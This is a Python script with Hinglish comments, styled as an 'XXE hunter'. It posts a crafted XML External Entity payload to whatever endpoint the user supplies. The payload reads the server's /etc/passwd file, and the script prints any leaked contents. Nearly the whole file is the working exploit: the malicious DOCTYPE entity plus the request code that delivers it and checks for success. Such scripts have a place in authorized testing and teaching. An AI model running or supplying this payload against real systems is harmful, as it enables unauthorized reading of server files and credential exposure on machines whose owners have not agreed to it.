import requests
import sys

def xxe_scan(target_url):
    print(f"\n[*] Bhai, starting XXE (XML External Entity) Scan on: {target_url}")
    print("[*] Crafting malicious XML payload to read /etc/passwd...\n")
    print("--------------------------------------------------")

    # The Hacker's XXE Payload
    # Hum ek 'xxe' naam ki entity bana rahe hain jo server ki /etc/passwd file ko point karti hai
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
    <user>&xxe;</user>
</data>"""

    # XXE attack ke liye humein server ko batana padta hai ki hum XML data bhej rahe hain
    headers = {
        'Content-Type': 'application/xml',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }

    print("[*] Sending malicious XML data to the server...")
    
    try:
        # POST request se XML data bhejna
        response = requests.post(target_url, data=xxe_payload, headers=headers, timeout=5)
        
        # Checking if the Linux /etc/passwd file was leaked in the response
        if "root:x:0:0:" in response.text:
            print("\n   [!!!] JACKPOT 🎯 CRITICAL XXE VULNERABILITY FOUND!")
            print("   [!!!] We successfully read the server's /etc/passwd file.")
            print("   [!!!] The server is processing External Entities!\n")
            print("   [!] Leaked Data Snippet:")
            # Printing just the first 150 characters of the leaked file to avoid terminal spam
            print(f"       {response.text[:150]}...")
        else:
            print("\n[-] No XXE found. Server is either secure, ignoring XML, or not reflecting the data.")
            print(f"[*] Server Status Code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"\n[-] Arre yaar, connection skipped/timeout: {e}")

    print("--------------------------------------------------")
    print("[+] XXE Hunt Complete, Bhai!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 xxe_hunter.py <target_api_endpoint>")
        print("Example: python3 xxe_hunter.py http://testphp.vulnweb.com/xml_api.php")
        sys.exit(1)
        
    target = sys.argv[1]
    xxe_scan(target)
